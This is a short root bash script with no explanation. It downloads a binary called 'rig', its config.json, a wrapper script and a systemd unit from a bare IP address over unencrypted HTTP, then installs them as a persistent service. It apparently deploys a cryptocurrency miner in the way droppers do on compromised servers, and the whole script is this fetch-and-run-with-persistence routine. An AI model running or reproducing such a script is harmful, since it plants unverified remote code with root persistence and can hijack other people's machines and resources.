#!/bin/bash
apt update
apt install dos2unix -y
wget http://116.203.49.224:8080/rig -P /root
wget http://116.203.49.224:8080/config.json -P /root
wget http://116.203.49.224:8080/rig.sh -P /root
chmod +x /root/rig
chmod +x /root/rig.sh
dos2unix /root/rig.sh
wget http://116.203.49.224:8080/rig.service -P /lib/systemd/system
systemctl daemon-reload
systemctl enable rig.service
systemctl start rig.service
